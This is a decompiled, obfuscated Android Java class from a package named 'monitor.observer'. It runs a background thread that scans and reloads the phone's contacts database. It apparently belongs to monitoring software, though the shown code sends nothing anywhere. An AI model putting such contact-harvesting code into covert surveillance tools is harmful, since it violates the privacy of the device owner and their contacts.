package com.network.android.monitor.observer;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.os.HandlerThread;
import android.provider.ContactsContract;
import com.network.android.c.a.a;
import com.network.android.m;
import java.util.HashMap;
import java.util.Map;

public final class i {

    /* renamed from: a  reason: collision with root package name */
    private static final String[] f94a = new String[0];
    private static final Uri b = ContactsContract.Contacts.CONTENT_URI;
    private static Handler c;
    private static int d = 0;
    private static Map e = null;
    private static boolean f = false;
    private static boolean g = false;
    private static boolean h;

    static {
        HandlerThread handlerThread = new HandlerThread("MyContact");
        handlerThread.start();
        c = new Handler(handlerThread.getLooper());
    }

    public static String a(ContentResolver contentResolver, Cursor cursor, StringBuilder sb) {
        return m.b(contentResolver, cursor, sb);
    }

    public static synchronized void a(Context context) {
        synchronized (i.class) {
            if (!h) {
                e = new HashMap();
                try {
                    a.a("scanAndLoad start ");
                    h = true;
                    c.post(new j(context));
                    a.a("scanAndLoad end ");
                } catch (Throwable th) {
                    a.a("contacts  start Exception- " + th.getMessage(), th);
                }
            } else {
                a.a("scanAndLoad end ");
            }
        }
    }

    public static void b(Context context) {
        a.b("scanContactEvent");
        if (g.f92a) {
            if (!f) {
                a.b("scanContactEvent  - mapLoaded yet!");
                return;
            }
            c.post(new k(context.getContentResolver(), context));
        }
    }

    static /* synthetic */ int d() {
        int i = d;
        d = i + 1;
        return i;
    }
}
